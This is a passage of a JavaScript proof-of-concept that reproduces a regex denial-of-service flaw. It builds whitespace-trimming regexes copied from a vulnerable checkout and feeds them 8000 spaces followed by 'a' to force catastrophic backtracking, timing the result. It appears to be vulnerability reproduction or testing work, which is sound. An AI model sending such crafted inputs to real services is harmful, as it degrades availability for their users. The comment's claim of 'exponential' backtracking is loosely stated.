   // overlapping character classes in the regex, followed by a non-matching char.
   // A length of 8000 ensures exponential backtracking steps will far exceed 30,000.
   const maliciousInput = '\x20'.repeat(8000) + 'a'; 

   console.log('Initializing vulnerable regex construction and execution...');
   console.time('reDOS-backtracking-meter');

   // Dynamically construct the regex exactly as defined in the vulnerable checkout
   const beginRx = new RegExp('^[' + ws + '][' + ws + ']*');
   const endRx = new RegExp('[' + ws + '][' + ws + ']*$');

   // Trigger the regex. Due to catastrophic backtracking, this will hang, 
   // consume >30k backtracking steps, or throw a limit-exceeded exception.
   const result = maliciousInput.replace(beginRx, '').replace(endRx, '');

   console.timeEnd('reDOS-backtracking-meter');
   console.log('Execution finished. Result length:', result.length);
